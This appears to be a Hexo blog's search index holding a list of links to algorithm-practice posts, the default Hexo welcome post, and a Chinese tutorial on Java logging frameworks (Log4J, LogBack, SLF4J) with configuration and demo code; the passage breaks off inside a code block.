<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>刷题汇总</title>
      <link href="/algorithm/"/>
      <url>/algorithm/</url>
      
        <content type="html"><![CDATA[<p><a href="https://toyan.top/algorithm-sort/">排序算法</a></p><p><a href="https://www.cnblogs.com/tongan-java/p/7599922.html" target="_blank" rel="noopener">剑指offer</a></p><p><a href="https://www.cnblogs.com/tongan-java/p/7284094.html" target="_blank" rel="noopener">leetcode</a></p><p><a href="https://www.cnblogs.com/tongan-java/p/8579047.html" target="_blank" rel="noopener">动态规划</a></p><p><a href="https://www.cnblogs.com/tongan-java/p/12774542.html" target="_blank" rel="noopener">背包九讲</a></p><p><a href="https://www.cnblogs.com/tongan-java/p/13173397.html" target="_blank" rel="noopener">LeetCode（力扣）3月「每日 1 题」</a></p><p><a href="https://www.cnblogs.com/tongan-java/p/13173416.html" target="_blank" rel="noopener">LeetCode（力扣）4月「每日 1 题」</a></p><p><a href="https://www.cnblogs.com/tongan-java/p/13173456.html" target="_blank" rel="noopener">LeetCode（力扣）5月「每日 1 题」</a></p><p><a href="https://www.cnblogs.com/tongan-java/p/13173462.html" target="_blank" rel="noopener">LeetCode（力扣）6月「每日 1 题」</a></p><p><a href="https://www.cnblogs.com/tongan-java/p/13630015.html" target="_blank" rel="noopener">LeetCode（力扣）7月「每日 1 题」</a></p><p><a href="https://www.cnblogs.com/tongan-java/p/13630059.html" target="_blank" rel="noopener">LeetCode（力扣）8月「每日 1 题」</a></p><p><a href="https://www.cnblogs.com/tongan-java/p/13630065.html" target="_blank" rel="noopener">LeetCode（力扣）9月「每日 1 题」</a></p>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
          <category> leetcode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/hello-world/"/>
      <url>/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="quick-start"><a class="markdownIt-Anchor" href="#quick-start"></a> Quick Start</h2><h3 id="create-a-new-post"><a class="markdownIt-Anchor" href="#create-a-new-post"></a> Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="run-server"><a class="markdownIt-Anchor" href="#run-server"></a> Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="generate-static-files"><a class="markdownIt-Anchor" href="#generate-static-files"></a> Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="deploy-to-remote-sites"><a class="markdownIt-Anchor" href="#deploy-to-remote-sites"></a> Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java日志框架</title>
      <link href="/spring-logger/"/>
      <url>/spring-logger/</url>
      
        <content type="html"><![CDATA[<p>在Java开发中，常用的日志框架有<code>JDKLog、Log4J、LogBack、SLF4J</code>。这些日志记录框架各有各的特点，各有各的应用场景。了解这些框架的特点及应用场景，有利于我们做技术选型的时候做出正确的判断。</p><h1 id="java日志框架简要介绍"><a class="markdownIt-Anchor" href="#java日志框架简要介绍"></a> JAVA日志框架简要介绍</h1><h2 id="jdklog日志小刀"><a class="markdownIt-Anchor" href="#jdklog日志小刀"></a> JDKLog——日志小刀</h2><p>JDKLog是JDK官方提供的一个记录日志的方式，直接在JDK中就可以使用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JDKLog</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Logger logger = Logger.getLogger(<span class="string">"JDKLog"</span>);</span><br><span class="line">        logger.info(<span class="string">"Hello World."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​JDKLog的有点是使用非常简单，直接在 JDK 中就可以使用。但 JDKLog 功能比较太过于简单，不支持占位符显示，拓展性比较差，所以现在用的人也很少。</p><h2 id="log4j日志大炮"><a class="markdownIt-Anchor" href="#log4j日志大炮"></a> Log4J——日志大炮</h2><p>Log4J是Apache的一个日志开源框架，有多个分级（<code>DEBUG/INFO/WARN/ERROR</code>）记录级别，可以很好地将不同日志界别的日志分开记录，极大地方便了日志的查看。<br />Log4J有1.X和2.X两个版本，现在官方推荐使用2.X版本，2.X版本在架构上进行了一些升级，配置文件也发生了一些变化。<br />使用Log4J框架首先需要引入依赖的包：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>增加log4J2.xml放在resource目录下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">"WARN"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">"Console"</span> <span class="attr">target</span>=<span class="string">"SYSTEM_OUT"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">"%d&#123;HH:mm:ss.SSS&#125; [%t] %-5level %logger&#123;36&#125; - %msg%n"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Console</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">"info"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">"Console"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中&lt;ROOT&gt;节点的level级别表示输出的最低级别。<br />最后编写一个测试类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="comment">/****</span></span><br><span class="line"><span class="comment"> ** Log4J Demo</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Log4jLog</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        Logger logger = LogManager.getLogger(Log4jLog<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        logger.debug(<span class="string">"Debug Level"</span>);</span><br><span class="line">        logger.info(<span class="string">"Info Level"</span>);</span><br><span class="line">        logger.warn(<span class="string">"Warn Level"</span>);</span><br><span class="line">        logger.error(<span class="string">"Error Level"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果没有配置log4j2.xml配置文件，那么LOG4J将自动启用类似于下面的配置文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">"WARN"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">"Console"</span> <span class="attr">target</span>=<span class="string">"SYSTEM_OUT"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">"%d&#123;HH:mm:ss.SSS&#125; [%t] %-5level %logger&#123;36&#125; - %msg%n"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Console</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">"error"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">"Console"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>使用默认配置文件的输出结果：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ERROR StatusLogger No log4j2 configuration file found. Using default configuration: logging only errors to the console.</span><br><span class="line">11:40:07.377 [main] ERROR com.chanshuyi.Log4jLog - Error Level</span><br></pre></td></tr></table></figure><p>从上面的使用步骤可以看出Log4J的使用稍微复杂一些，但是条理还是很清晰的。而且因为Log4J有多个分级（DEBUG/INFO/WARN/ERROR）记录级别，所以可以很好地记录不同业务问题。因为这些优点，所有在几年前几乎所有人都使用LOG4J作为日志记录框架。<br />但LOG4J本身也存在一些缺点，比如不支持使用占位符，不利于代码阅读等缺点，但是相比JDKLog，LOG4J已经是非常好的日志记录框架了。</p><h2 id="logback日志火箭"><a class="markdownIt-Anchor" href="#logback日志火箭"></a> LogBack——日志火箭</h2><p>LogBack其实可以说是Log4J的进化版，因为它们两个都是同一个人设计的开源框架。LogBack 除了具备 Log4j 的所有优点之外，还解决了 Log4J 不能使用占位符的问题。<br />使用LogBack需要首先引入依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- LogBack --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ch.qos.logback<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>logback-classic<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>配置logback.xml配置文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">"STDOUT"</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.ConsoleAppender"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">layout</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.classic.PatternLayout"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Pattern</span>&gt;</span>%d&#123;HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n<span class="tag">&lt;/<span class="name">Pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">layout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">"com.chanshuyi"</span> <span class="attr">level</span>=<span class="string">"TRACE"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">"debug"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">"STDOUT"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>LogBack的日志级别区分可以细分到类或者包，这样就可以使日志记录变得更加灵活。之后在类文件中引入Logger类，并进行日志记录。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.slf4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.LoggerFactory;</span><br><span class="line"></span><br><span class="line"><span class="comment">/****</span></span><br><span class="line"><span class="comment"> ** LogBack Demo</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LogBack</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LoggerFactory.getLogger(LogBack<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        logger.trace(<span class="string">"Trace Level."</span>);</span><br><span class="line">        logger.debug(<span class="string">"Debug Level."</span>);</span><br><span class="line">        logger.info(<span class="string">"Info Level."</span>);</span><br><span class="line">        logger.warn(<span class="string">"Warn Level."</span>);</span><br><span class="line">        logger.error(<span class="string">"Error Level."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>LogBack解决了Log4J不能使用占位符的问题，这使得阅读日志代码非常方便。除此之外，LogBack比Log4J有更快的运行速度，更好的内部实现。并且LogBack内部集成了Slf4J可以更原生地实现一些日志记录的实现。</p><h2 id="slf4j适配器"><a class="markdownIt-Anchor" href="#slf4j适配器"></a> SLF4J——适配器</h2><p>为了避免切换日志组件时要改动代码，这时候一个叫做SLF4J（Simple Logging Facade for Java，即Java简单日志记录接口集）的东西出现。<br />SLF4J是一个日志的接口规范，它对用户提供了统一的日志接口，屏蔽了不同日志组件的差异。这样我们在编写代码的时候只需要看SLF4J这个接口文档即可，不需要去理会不同日志框架的区别。而当我们需要更换日志组件的时候，我们只需要更换一个具体的日志组件Jar包就可以。<br />下面是整合SLF4J和日志框架的使用方式</p><p><strong>SLF4J + JDKLog</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.21<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-jdk14<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.21<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>SLF4J + LOG4J</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.21<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-log4j12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.21<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.17<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>配置log4J.xml文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">log4j</span>:configuration <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"log4j.dtd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">log4j:configuration</span> <span class="attr">xmlns:log4j</span>=<span class="string">'http://jakarta.apache.org/log4j/'</span> &gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">"myConsole"</span> <span class="attr">class</span>=<span class="string">"org.apache.log4j.ConsoleAppender"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">layout</span> <span class="attr">class</span>=<span class="string">"org.apache.log4j.PatternLayout"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"ConversionPattern"</span></span></span><br><span class="line"><span class="tag">                   <span class="attr">value</span>=<span class="string">"[%d&#123;dd HH:mm:ss,SSS\&#125; %-5p] [%t] %c&#123;2\&#125; - %m%n"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">layout</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--过滤器设置输出的级别--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">"org.apache.log4j.varia.LevelRangeFilter"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"levelMin"</span> <span class="attr">value</span>=<span class="string">"debug"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"levelMax"</span> <span class="attr">value</span>=<span class="string">"error"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"AcceptOnMatch"</span> <span class="attr">value</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 根logger的设置--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">priority</span> <span class="attr">value</span> =<span class="string">"debug"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">"myConsole"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">log4j:configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>SLF4J + LogBack</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.21<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ch.qos.logback<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>logback-classic<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ch.qos.logback<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>logback-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>配置logBack.xml文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 